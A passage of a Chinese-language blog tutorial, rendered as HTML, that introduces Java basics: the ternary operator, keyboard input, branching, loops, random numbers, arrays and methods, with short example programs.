class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">double</span> <span class="variable">score</span> <span class="operator">=</span> <span class="number">99.5</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> score &gt;= <span class="number">60</span> ?<span class="string">&quot;及格&quot;</span>:<span class="string">&quot;不及格&quot;</span>;</span><br><span class="line">    System.out.println(res);    <span class="comment">//及格</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309121623391.png" alt="image-20230912162356326"></p><h2 id="键盘输入"><a href="#键盘输入" class="headerlink" title="键盘输入"></a>键盘输入</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    System.out.println(<span class="string">&quot;输入一个整数:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">    System.out.println(age);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h1><h2 id="if结构"><a href="#if结构" class="headerlink" title="if结构"></a>if结构</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IfDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;输入体温:&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">t</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">        <span class="keyword">if</span> (t &gt; <span class="number">37.8</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;体温异常:&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;正常&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="else-if结构"><a href="#else-if结构" class="headerlink" title="else if结构"></a>else if结构</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IfDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;输入分数:&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">        <span class="keyword">if</span> (score &gt;= <span class="number">0</span> &amp;&amp; score &lt;= <span class="number">60</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt; <span class="number">60</span> &amp;&amp; score &lt;= <span class="number">80</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt; <span class="number">80</span> &amp;&amp; score &lt;= <span class="number">90</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt; <span class="number">90</span> &amp;&amp; score &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;输入有误&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    System.out.println(<span class="string">&quot;输入日期:&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">week</span> <span class="operator">=</span> sc.next();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">switch</span> (week)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;周一&quot;</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;今天周一&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;周二&quot;</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;今天周二&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;周三&quot;</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;今天周三&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;周四&quot;</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;今天周四&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;周五&quot;</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;今天周五&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;输入错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    System.out.println(<span class="string">&quot;输入日期:&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">week</span> <span class="operator">=</span> sc.next();</span><br><span class="line">    <span class="keyword">switch</span> (week) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;周一&quot;</span> -&gt; System.out.println(<span class="string">&quot;今天周一&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;周二&quot;</span> -&gt; System.out.println(<span class="string">&quot;今天周二&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;周三&quot;</span> -&gt; System.out.println(<span class="string">&quot;今天周三&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;周四&quot;</span> -&gt; System.out.println(<span class="string">&quot;今天周四&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;周五&quot;</span> -&gt; System.out.println(<span class="string">&quot;今天周五&quot;</span>);</span><br><span class="line">        <span class="keyword">default</span> -&gt; System.out.println(<span class="string">&quot;输入错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309121950481.png" alt="image-20230912195005416"></p><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">        i+=<span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do while循环"></a>do while循环</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;<span class="keyword">while</span> (i&lt;<span class="number">3</span>);   <span class="comment">//先执行,后判断</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309122012282.png" alt="image-20230912201218226"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309122017938.png" alt="image-20230912201740892"></p><h2 id="跳转关键字"><a href="#跳转关键字" class="headerlink" title="跳转关键字"></a>跳转关键字</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309122024257.png" alt="image-20230912202433204"></p><h2 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">date</span> <span class="operator">=</span> r.nextInt(<span class="number">10</span>);</span><br><span class="line">        System.out.println(date);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>猜数字</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">date</span> <span class="operator">=</span> r.nextInt(<span class="number">1</span>,<span class="number">11</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;猜一个数字0-10:&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">input</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">        <span class="keyword">if</span> (input == date) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;猜对了&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;猜错了,数字是:&quot;</span>+date);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="静态数组定义和访问"><a href="#静态数组定义和访问" class="headerlink" title="静态数组定义和访问"></a>静态数组定义和访问</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] age = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; age.length; i++) &#123;</span><br><span class="line">        System.out.println(age[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] age = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j : age) &#123;</span><br><span class="line">        System.out.println(j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309131756760.png" alt="image-20230913175646143"></p><h2 id="动态数组"><a href="#动态数组" class="headerlink" title="动态数组"></a>动态数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] age =<span class="keyword">new</span> <span class="title class_">int</span> [<span class="number">3</span>];</span><br><span class="line">    System.out.println(age[<span class="number">1</span>]); <span class="comment">//0</span></span><br><span class="line">    age[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">    System.out.println(age[<span class="number">0</span>]); <span class="comment">//2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309131808561.png" alt="image-20230913180826506"></p><h2 id="数组最大值"><a href="#数组最大值" class="headerlink" title="数组最大值"></a>数组最大值</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//定义数组</span></span><br><span class="line">        <span class="type">int</span>[] faceScores = &#123;<span class="number">15</span>,<span class="number">2000</span>,<span class="number">10000</span>,<span class="number">20000</span>,<span class="number">9500</span>,-<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="comment">//定义一个变量用于记录最终最大值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> faceScores[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//从数组第二个开始遍历</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; faceScores.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (faceScores[i]&gt;max)&#123;</span><br><span class="line">                max = faceScores[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(max);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="数组反转"><a href="#数组反转" class="headerlink" title="数组反转"></a>数组反转</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//1. 定义一个数组</span></span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="comment">//2. 定义个循环,设计两个变量,一个在前一个在后</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = arr.length - <span class="number">1</span>; i &lt; j; i++, j--) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[j];</span><br><span class="line">        arr[j] = arr[i];</span><br><span class="line">        arr[i] =temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>; a &lt; arr.length; a++) &#123;</span><br><span class="line">        System.out.print(arr[a]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组随机"><a href="#数组随机" class="headerlink" title="数组随机"></a>数组随机</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayRand</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义动态数组</span></span><br><span class="line">        <span class="type">int</span>[] codes = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">5</span>];</span><br><span class="line">        <span class="comment">// 输入工号</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="comment">// 将输入的工号加入数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; codes.length ; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;输入工号:&quot;</span>);</span><br><span class="line">            codes[i] = sc.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 生成随机数</span></span><br><span class="line">        <span class="type">Random</span> <span class="variable">ran</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; codes.length; j++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> ran.nextInt(codes.length);</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> codes[index];</span><br><span class="line">            codes[index] = codes[j];</span><br><span class="line">            codes[j] = temp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; codes.length; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;随机排序:&quot;</span> + codes[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><h2 id="自定义方法"><a href="#自定义方法" class="headerlink" title="自定义方法"></a>自定义方法</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309181651169.png" alt="image-20230918165038495"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> sum(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自定义方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309191501328.png" alt="image-20230919150151252"></p><h2 id="求和自定义方法"><a href="#求和自定义方法" class="headerlink" title="求和自定义方法"></a>求和自定义方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> sum(<span class="number">5</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> n )</span>&#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            sum+=i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参数传递机制"><a href="#参数传递机制" class="headerlink" title="参数传递机制"></a>参数传递机制</h2><h3 id="基本类型参数传递"><a href="#基本类型参数传递" class="headerlink" title="基本类型参数传递"></a>基本类型参数传递</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    change(a);</span><br><span class="line">    System.out.println(a); <span class="comment">//10</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">change</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">    System.out.println(a); <span class="comment">//10</span></span><br><span class="line">    a = <span class="number">20</span>;</span><br><span class="line">    System.out.println(a); <span class="comment">//20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202309191525009.png" alt="image-20230919152529940"></p><h3 id="引用类型参数传递"><a href="#引用类型参数传递" class="headerlink" title="引用类型参数传递"></a>引用类型参数传递</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span 